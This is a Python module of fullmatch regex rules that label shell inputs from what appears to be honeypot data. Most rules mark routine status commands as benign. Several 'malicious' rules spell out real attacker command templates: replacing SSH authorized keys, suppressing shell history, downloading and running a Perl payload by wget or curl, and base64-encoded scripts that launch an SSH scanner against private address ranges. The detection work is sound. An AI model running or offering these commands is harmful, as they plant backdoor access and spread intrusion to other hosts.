"""Conservative whole-input rules for frequent CyberLab command templates.

Follow schema.md: ordinary status queries are benign even in hostile sessions.
Password changes, arbitrary downloads, marker files and unfamiliar executables
remain unknown. Rules apply only to SHELL_INPUTS, not to component processes.
Use fullmatch on the original text: never strip, split, or search a substring.
"""

import re

# Each tuple is (name, regexp, label). Counts and sampled matches are recorded
# in the pull request. Every rule matched at least 1,000 published observations.
HEURISTICS = (
    ("uname", r"uname(?: -[am])?", "benign"),
    ("top", r"(?:LC_ALL=C )?top(?: -bn1)?", "benign"),
    ("list-crontab", r"(?:LC_ALL=C )?crontab -l", "benign"),
    ("cpu-count", r"cat /proc/cpuinfo \| grep name \| wc -l", "benign"),
    ("cpu-name", (r"cat /proc/cpuinfo \| grep name \| head -n 1 \| "
     r"awk '\{print \$4,\$5,\$6,\$7,\$8,\$9;\}'"), "benign"),
    ("memory-fields", (r"free -m \| grep Mem \| "
     r"awk '\{print \$2 ,\$3, \$4, \$5, \$6, \$7\}'"), "benign"),
    ("logged-in-users", r"w", "benign"),
    ("ls-binary-metadata", r"ls -lh \$\(which ls\)", "benign"),
    ("cpu-model", r"lscpu \| grep Model", "benign"),
    ("cpu-model-count", r"cat /proc/cpuinfo \| grep model \| grep name \| wc -l", "benign"),
    ("proc-information", r"cat /proc/(?:cpuinfo|version)", "benign"),
    ("locate-ls", r"which ls", "benign"),
    ("memory", r"free(?: -m[t]?)?", "benign"),
    ("process-list", r"ps(?: -x| x)?", "benign"),
    ("find-miner-process", r"ps(?: -ef)? \| grep '\[Mm\]iner'", "benign"),
    ("hardware-vendor", r"dmidecode\|grep Vendor\|head -n 1", "benign"),
    ("kernel-virtualization", r"dmesg \| grep irtual", "benign"),
    ("pci-virtualization", r"lspci \| grep irti", "benign"),
    ("interfaces", r"(?:/sbin/)?ifconfig(?: -a)?", "benign"),
    ("processor-count", r"nproc", "benign"),
    ("router-cloud-status", r"/ip cloud print", "benign"),
    ("numbered-greeting", r"echo Hi \| cat -n", "benign"),
    # Erase existing SSH keys, then install this access key. Keep the observed
    # key comment; allow only base64 characters in the key, with no shell code.
    ("replace-ssh-access", (r'cd ~ && rm -rf \.ssh && mkdir \.ssh && echo "ssh-rsa '
     r'[A-Za-z0-9+/=]+ mdrfckr">>\.ssh/authorized_keys && chmod -R go= ~/\.ssh && cd ~'),
     "malicious"),
    # Suppress shell history, fetch and execute a Perl payload, then remove it.
    # Backreferences require both download commands and execution to agree.
    ("hidden-perl-download", (r"uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;"
     r"history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;"
     r"cd /var/tmp;cd /tmp;rm -rf (?P<file>kik\.pl|zyk);"
     r"wget -q(?: --timeout=(?:15|30) --tries=2)? "
     r"(?P<url>[0-9.]+/[A-Za-z0-9_./-]+/(?P=file)) \|\| "
     r"curl(?: --connect-timeout 15)? -s -O -f (?P=url);perl (?P=file);"
     r"rm -rf (?P=file)(?: \.a)?(?:;cd /tmp;)?"), "malicious"),
    # Hide the history of an authorized_keys replacement. Restrict both quoted
    # strings to base64 characters so neither can close its shell quote.
    ("hidden-ssh-access", (r"uname -a;unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH;"
     r"history -n;export HISTFILE=/dev/null;export HISTSIZE=0;export HISTFILESIZE=0;"
     r"cd;mkdir \.ssh;cat \.ssh/authorized_keys\|grep -v '[A-Za-z0-9+/=]+' >>\.ssh/\.auth_k;"
     r"echo 'ssh-rsa [A-Za-z0-9+/=]+' >> \.ssh/\.auth_k;mv \.ssh/\.auth_k \.ssh/authorized_keys;cd"),
     "malicious"),
    # Exact inspected payloads: unpack hidden .rsync tooling, then run tsm
    # against 192.168 and 172.16 on port 22 using /tmp/up.txt. Do not accept
    # arbitrary base64, which can encode harmless commands too.
    ("encoded-private-scan-x17", r'sleep 15s && cd /var/tmp; echo "' + re.escape(
     "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJm"
     "IC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFy"
     "Lmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1w"
     "Ly5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAg"
     "L3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8u"
     "cnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQg"
     "MTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRh"
     "bGwgMj4xJgpleGl0IDA="
     ) + r'" \| base64 --decode \| bash', "malicious"),
    ("encoded-private-scan-x19", r'sleep 15s && cd /var/tmp; echo "' + re.escape(
     "IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJm"
     "IC5YMTctdW5peApybSAtcmYgLlgxOS11bml4Cm1rZGlyIC5YMTktdW5peApjZCAuWDE5LXVuaXgKbXYgL3Zhci90bXAvZG90"
     "YTMudGFyLmd6IGRvdGEzLnRhci5negp0YXIgeGYgZG90YTMudGFyLmd6CnNsZWVwIDNzICYmIGNkIC90bXAvLlgxOS11bml4"
     "Ly5yc3luYy9jCm5vaHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAg"
     "LWYgMCAtayAxIC1sIDEgLWkgMCAvdG1wL3VwLnR4dCAxOTIuMTY4ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDhtICYmIG5v"
     "aHVwIC90bXAvLlgxOS11bml4Ly5yc3luYy9jL3RzbSAtdCAxNTAgLVMgNiAtcyA2IC1wIDIyIC1QIDAgLWYgMCAtayAxIC1s"
     "IDEgLWkgMCAvdG1wL3VwLnR4dCAxNzIuMTYgPj4gL2Rldi9udWxsIDI+MSYKc2xlZXAgMjBtICYmIGNkIC4uOyAvdG1wLy5Y"
     "MTktdW5peC8ucnN5bmMvaW5pdGFsbCAyPjEmCmV4aXQgMA=="
     ) + r'" \| base64 --decode \| bash', "malicious"),
)


_COMPILED = tuple((re.compile(pattern), label) for _, pattern, label in HEURISTICS)


def cyberlab_label(text: str) -> str:
    """Label one complete shell input; unmatched inputs remain unknown."""
    for pattern, label in _COMPILED:
        if pattern.fullmatch(text):
            return label
    return "unknown"
